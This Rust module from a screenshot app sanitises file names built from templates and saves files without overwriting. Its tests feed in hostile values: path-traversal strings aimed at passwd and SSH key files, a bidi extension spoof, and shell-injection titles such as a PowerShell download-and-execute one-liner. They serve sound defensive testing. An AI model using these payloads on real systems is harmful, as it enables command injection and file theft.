//! File names and the files themselves: the template of Settings › Output filled in and made
//! safe, and new files written so that no existing file is ever replaced.
//!
//! A filled-in template is one file name, never a path: the values of `{app}` and `{title}` come
//! from other apps, so a separator, `..`, a leading dot, a control or bidi character or a
//! reserved device name (`CON`, `NUL`, `COM1`…) can reach it, and each is neutralised before the
//! name meets the file system. On Windows those two values also lose the characters a shell runs
//! code with inside the quotes of a copied path ([`SHELL_ACTIVE`]).

use std::collections::HashSet;
use std::fs::{self, File, OpenOptions};
use std::io::{self, ErrorKind, Write};
use std::path::{Path, PathBuf};

/// A name longer than this many bytes is cut (at a character boundary), which leaves room for
/// " (10000)" and the extension under the 255-byte limit of APFS, NTFS and ext4.
const MAX_STEM_BYTES: usize = 200;

/// The name a template gives when nothing usable is left of it.
const FALLBACK_STEM: &str = "Glimpsfy";

/// How many names a save tries before it gives up.
const MAX_ATTEMPTS: u32 = 10_000;

/// The values of the file name tokens for one capture.
pub struct Naming<'a> {
    /// `2026-11-16`
    pub date: String,
    /// `14.32.07`
    pub time: String,
    /// The frontmost app at capture time.
    pub app: Option<&'a str>,
    pub width: u32,
    pub height: u32,
}

impl Naming<'_> {
    /// The date and time tokens of `now`, in the forms the default template expects.
    pub fn clock(now: chrono::DateTime<chrono::Local>) -> (String, String) {
        (now.format("%Y-%m-%d").to_string(), now.format("%H.%M.%S").to_string())
    }
}

/// The file name (without extension) a template gives: `{date}`, `{time}`, `{app}`,
/// `{counter}`, `{width}` and `{height}` are replaced, and the result is made safe
/// ([`sanitize`]). `{title}` becomes nothing here; [`file_stem_titled`] fills it.
pub fn file_stem(template: &str, naming: &Naming, counter: u32) -> String {
    file_stem_titled(template, naming, None, counter)
}

/// [`file_stem`] with the `{title}` token: the captured window's title, when there is one.
pub fn file_stem_titled(template: &str, naming: &Naming, title: Option<&str>, counter: u32) -> String {
    // Each value is made safe before it goes in, so it cannot form a separator or `..` together
    // with the template's own characters; the whole name is checked once more afterwards.
    let value = |text: &str| neutralise(text);
    let foreign = |text: &str| foreign_value(text, cfg!(windows));
    let name = template
        .replace("{date}", &value(&naming.date))
        .replace("{time}", &value(&naming.time))
        .replace("{app}", &foreign(naming.app.unwrap_or("Screen")))
        .replace("{title}", &foreign(title.unwrap_or("")))
        .replace("{counter}", &counter.to_string())
        .replace("{width}", &naming.width.to_string())
        .replace("{height}", &naming.height.to_string());
    sanitize(&name)
}

/// One file name from any text: separators, `:` and the characters Windows refuses become `-`,
/// control and bidi characters become `-`, runs of spaces become one, dots and spaces go from
/// both ends (no hidden file, no `.` or `..`), a reserved device name gets a leading `_`, and
/// a name over 200 bytes is cut. An empty result is "Glimpsfy".
pub fn sanitize(name: &str) -> String {
    let swapped = neutralise(name);
    let mut collapsed = String::with_capacity(swapped.len());
    for c in swapped.chars() {
        if c.is_whitespace() {
            if !collapsed.ends_with(' ') {
                collapsed.push(' ');
            }
        } else {
            collapsed.push(c);
        }
    }
    let trimmed = cut(collapsed.trim_matches(|c: char| c == '.' || c == ' '), MAX_STEM_BYTES);
    let trimmed = trimmed.trim_end_matches(['.', ' ']);
    if trimmed.is_empty() {
        return FALLBACK_STEM.into();
    }
    if is_reserved(trimmed) {
        return format!("_{trimmed}");
    }
    trimmed.to_string()
}

/// What a Windows shell acts on inside the double quotes `send::quote_path` puts around a copied
/// path: `$` and the backtick start a substitution in Git Bash, `!` a history expansion in an
/// interactive bash, and PowerShell ends a double-quoted string at the typographic double quotes.
/// The quoting escapes these for PowerShell, but no quoting suits PowerShell, cmd and bash at
/// once, so a name never takes them from another app.
const SHELL_ACTIVE: [char; 6] = ['$', '`', '!', '\u{201C}', '\u{201D}', '\u{201E}'];

/// The value of `{app}` or `{title}`, which other apps choose (a web page's title, anyone):
/// neutralised, and on Windows without the characters of [`SHELL_ACTIVE`]. The quoting of macOS
/// and Linux escapes all of them, so names there keep them.
fn foreign_value(text: &str, windows: bool) -> String {
    let text = neutralise(text);
    if windows {
        text.chars().filter(|c| !SHELL_ACTIVE.contains(c)).collect()
    } else {
        text
    }
}

/// Swaps every character no file name may hold for `-`.
fn neutralise(text: &str) -> String {
    text.chars()
        .map(|c| {
            let refused = matches!(c, '/' | '\\' | ':' | '*' | '?' | '"' | '<' | '>' | '|')
                || c.is_control()
                // Bidi overrides and isolates, which can disguise an extension.
                || matches!(c, '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{200E}' | '\u{200F}');
            if refused {
                '-'
            } else {
                c
            }
        })
        .collect()
}

/// `text` cut to at most `max` bytes at a character boundary.
fn cut(text: &str, max: usize) -> &str {
    if text.len() <= max {
        return text;
    }
    let mut end = max;
    while !text.is_char_boundary(end) {
        end -= 1;
    }
    &text[..end]
}

/// Whether Windows reserves the name for a device (`CON`, `PRN`, `AUX`, `NUL`, `COM1`–`COM9`,
/// `LPT1`–`LPT9`), whatever the case and whatever follows its first dot.
fn is_reserved(name: &str) -> bool {
    let stem = name.split('.').next().unwrap_or(name).trim_end().to_ascii_uppercase();
    match stem.as_str() {
        "CON" | "PRN" | "AUX" | "NUL" => true,
        _ => {
            let (Some(head), Some(tail)) = (stem.get(..3), stem.get(3..)) else {
                return false;
            };
            matches!(head, "COM" | "LPT") && matches!(tail.as_bytes(), [b'1'..=b'9'])
        }
    }
}

/// Writes `bytes` to a new file in `folder` named by `template`, and never replaces a file: when
/// the name is taken, `{counter}` counts up, or a template without it gets " (2)", " (3)"… The
/// check and the creation are one step (`create_new`), so two saves at once cannot take the
/// same name either.
pub fn save_unique(
    folder: &Path,
    template: &str,
    naming: &Naming,
    extension: &str,
    bytes: &[u8],
) -> io::Result<PathBuf> {
    save_unique_titled(folder, template, naming, None, extension, bytes)
}

/// [`save_unique`] with the `{title}` token.
pub fn save_unique_titled(
    folder: &Path,
    template: &str,
    naming: &Naming,
    title: Option<&str>,
    extension: &str,
    bytes: &[u8],
) -> io::Result<PathBuf> {
    let counts = template.contains("{counter}");
    write_unique(
        folder,
        extension,
        counts,
        |n| file_stem_titled(template, naming, title, n),
        |file| file.write_all(bytes),
    )
}

/// Writes `bytes` as `<stem>.<extension>` in `folder`, where the user picked the name (Save as):
/// the name is kept as it is (made safe), and a taken one gets " (2)", " (3)"…
pub fn save_named(folder: &Path, stem: &str, extension: &str, bytes: &[u8]) -> io::Result<PathBuf> {
    let stem = sanitize(stem);
    write_unique(folder, extension, false, |_| stem.clone(), |file| file.write_all(bytes))
}

/// [`save_named`] for bytes that are already a file (Save as of a history entry). They are
/// streamed, so a long recording is never read into memory whole.
pub fn copy_named(folder: &Path, stem: &str, extension: &str, source: &Path) -> io::Result<PathBuf> {
    let stem = sanitize(stem);
    let mut from = File::open(source)?;
    write_unique(folder, extension, false, |_| stem.clone(), |file| io::copy(&mut from, file).map(|_| ()))
}

/// The one writer: tries `stem(1)`, `stem(2)`… (a counting template) or `stem(1)`,
/// `stem(1) (2)`… (any other), each with `create_new`, until a name is free, and lets `fill`
/// write the one file it made.
fn write_unique(
    folder: &Path,
    extension: &str,
    counts: bool,
    stem: impl Fn(u32) -> String,
    mut fill: impl FnMut(&mut File) -> io::Result<()>,
) -> io::Result<PathBuf> {
    fs::create_dir_all(folder)?;
    let extension = neutralise(extension).trim_matches('.').to_string();
    let mut tried = HashSet::new();
    for n in 1..=MAX_ATTEMPTS {
        let stem = stem(n);
        // A long title can push `{counter}` past the length limit, so the counting stem comes
        // out the same for every number; a stem met before gets the suffix, or every attempt
        // would try the one taken name.
        let fresh = tried.insert(stem.clone());
        let name = if n == 1 || (counts && fresh) {
            format!("{stem}.{extension}")
        } else {
            format!("{stem} ({n}).{extension}")
        };
        let path = folder.join(name);
        match OpenOptions::new().write(true).create_new(true).open(&path) {
            Ok(mut file) => {
                if let Err(error) = fill(&mut file).and_then(|_| file.sync_all()) {
                    drop(file);
                    let _ = fs::remove_file(&path);
                    return Err(error);
                }
                return Ok(path);
            }
            Err(error) if error.kind() == ErrorKind::AlreadyExists => continue,
            Err(error) => return Err(error),
        }
    }
    Err(io::Error::new(ErrorKind::AlreadyExists, "every file name for this capture is taken"))
}

/// Why the save folder of the settings cannot take a file.
#[derive(Debug)]
pub enum FolderProblem {
    /// The path is not absolute, so it names no particular folder.
    NotAbsolute,
    /// The folder is on a volume that is not mounted (`/Volumes/<name>` is missing). It is never
    /// made on the startup disk instead.
    Unmounted(String),
}

impl std::fmt::Display for FolderProblem {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            FolderProblem::NotAbsolute => f.write_str("the path is not absolute"),
            FolderProblem::Unmounted(volume) => write!(f, "the drive “{volume}” is not connected"),
        }
    }
}

/// Checks that `folder` can take a file, without making it on a drive that is not there.
pub fn check_folder(folder: &Path) -> Result<(), FolderProblem> {
    if !folder.is_absolute() {
        return Err(FolderProblem::NotAbsolute);
    }
    if let Some(volume) = unmounted_volume(folder) {
        return Err(FolderProblem::Unmounted(volume));
    }
    Ok(())
}

/// The volume's name when `folder` lies under `/Volumes/<name>` and that mount point is gone.
fn unmounted_volume(folder: &Path) -> Option<String> {
    let mut parts = folder.components();
    let _root = parts.next()?;
    let volumes = parts.next()?;
    if volumes.as_os_str() != "Volumes" {
        return None;
    }
    let name = parts.next()?.as_os_str().to_string_lossy().into_owned();
    let mount = Path::new("/Volumes").join(&name);
    (!mount.exists()).then_some(name)
}

/// Whether a write error means the folder itself is unusable (gone, read-only, full or locked),
/// so another folder should be tried, rather than a fault of this one file.
pub fn folder_failed(error: &io::Error) -> bool {
    matches!(
        error.kind(),
        ErrorKind::NotFound
            | ErrorKind::PermissionDenied
            | ErrorKind::ReadOnlyFilesystem
            | ErrorKind::StorageFull
            | ErrorKind::NotADirectory
            | ErrorKind::QuotaExceeded
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn naming(app: Option<&str>) -> Naming<'_> {
        Naming { date: "2026-11-16".into(), time: "14.32.07".into(), app, width: 640, height: 360 }
    }

    /// A save never replaces a file, in every format and with every kind of template: a taken
    /// name gets " (2)", " (3)"…, a template with `{counter}` counts up (skipping a file the user
    /// made by hand under the next number), a template that gives the same name twice in one
    /// second (no `{time}`, or the same second) keeps both, and a name picked in Save as never
    /// replaces the file it names. Every earlier file keeps its bytes.
    #[test]
    fn saving_never_replaces_an_existing_file() {
        let dir = tempfile::tempdir().unwrap();
        let formats = ["png", "jpg", "webp"];
        let templates = [
            (
                "Glimpsfy {date} at {time}",
                vec![
                    "Glimpsfy 2026-11-16 at 14.32.07",
                    "Glimpsfy 2026-11-16 at 14.32.07 (2)",
                    "Glimpsfy 2026-11-16 at 14.32.07 (3)",
                ],
            ),
            ("{app} {counter}", vec!["Safari 1", "Safari 3", "Safari 4"]),
            ("Shot", vec!["Shot", "Shot (2)", "Shot (3)"]),
            ("{title} {width}x{height}", vec!["Inbox 640x360", "Inbox 640x360 (2)", "Inbox 640x360 (3)"]),
        ];
        for extension in formats {
            let folder = dir.path().join(extension);
            fs::create_dir_all(&folder).unwrap();
            // A file the user made by hand under the counter's second number.
            fs::write(folder.join(format!("Safari 2.{extension}")), b"mine").unwrap();
            for (template, expected) in &templates {
                let mut written = Vec::new();
                for (i, name) in expected.iter().enumerate() {
                    let bytes = format!("{template} {i}");
                    let path = save_unique_titled(
                        &folder,
                        template,
                        &naming(Some("Safari")),
                        Some("Inbox"),
                        extension,
                        bytes.as_bytes(),
                    )
                    .unwrap();
                    assert_eq!(
                        path.file_name().unwrap().to_string_lossy(),
                        format!("{name}.{extension}"),
                        "{template}"
                    );
                    written.push((path, bytes));
                }
                for (path, bytes) in written {
                    assert_eq!(fs::read(&path).unwrap(), bytes.as_bytes(), "{}", path.display());
                }
            }
            assert_eq!(fs::read(folder.join(format!("Safari 2.{extension}"))).unwrap(), b"mine");

            // Save as: the picked name exists already.
            let picked = folder.join(format!("Report.{extension}"));
            fs::write(&picked, b"original").unwrap();
            let saved = save_named(&folder, "Report", extension, b"new").unwrap();
            assert_eq!(saved.file_name().unwrap().to_string_lossy(), format!("Report (2).{extension}"));
            assert_eq!(fs::read(&picked).unwrap(), b"original");
        }
    }

    /// Whatever an app calls itself or its window, and whatever the template holds, the name is
    /// one file inside the save folder: no separator, no `..`, no absolute path, no hidden file,
    /// no reserved device name, no control or bidi character, and not over the length limit.
    #[test]
    fn file_names_never_leave_the_save_folder() {
        let hostile = [
            "../../etc/passwd",
            "..",
            ".",
            "/Users/someone/.ssh/id_rsa",
            "C:\\Windows\\System32",
            "a/b\\c:d*e?f\"g<h>i|j",
            ".hidden",
            "CON",
            "nul.txt",
            "Com1",
            "LPT9.log",
            "tab\there\nnewline\u{0}nul",
            "evil\u{202E}gpj.exe",
            "   ",
            "",
            &"Ü".repeat(300),
        ];
        let templates = [
            "{app}",
            "{title}",
            "{app} {title}",
            "../{app}",
            "{title}/..",
            "..{app}..",
            "/{title}",
            "{date} {app} {counter}",
        ];
        let dir = tempfile::tempdir().unwrap();
        for value in hostile {
            for template in templates {
                let stem = file_stem_titled(template, &naming(Some(value)), Some(value), 1);
                for refused in ['/', '\\', ':', '*', '?', '"', '<', '>', '|', '\u{0}', '\n', '\t', '\u{202E}'] {
                    assert!(!stem.contains(refused), "{template} with {value:?} gave {stem:?}");
                }
                assert!(!stem.starts_with('.') && !stem.ends_with('.'), "{template} with {value:?} gave {stem:?}");
                assert!(!stem.is_empty() && stem.len() <= MAX_STEM_BYTES, "{template} with {value:?} gave {stem:?}");
                assert!(!is_reserved(&stem), "{template} with {value:?} gave {stem:?}");

                let path =
                    save_unique_titled(dir.path(), template, &naming(Some(value)), Some(value), "png", b"x").unwrap();
                assert_eq!(path.parent().unwrap(), dir.path(), "{template} with {value:?} wrote {}", path.display());
            }
        }
    }

    /// A web page's title never brings shell syntax into a Windows name, so a copied path pasted
    /// into Git Bash, PowerShell or cmd runs nothing; elsewhere the title stays as it reads.
    #[test]
    fn a_title_brings_no_shell_syntax_into_a_windows_name() {
        let titles =
            ["$(iwr evil|iex)", "`calc`", "${env:PATH} $HOME", "!r !-1", "x\u{201D}; calc; \u{201C}y \u{201E}z"];
        for title in titles {
            let windows = foreign_value(title, true);
            assert!(!windows.contains(SHELL_ACTIVE), "{title:?} gave {windows:?}");
        }
        assert_eq!(foreign_value("Fiyat $5!", true), "Fiyat 5");
        assert_eq!(foreign_value("Fiyat $5!", false), "Fiyat $5!");
    }
}
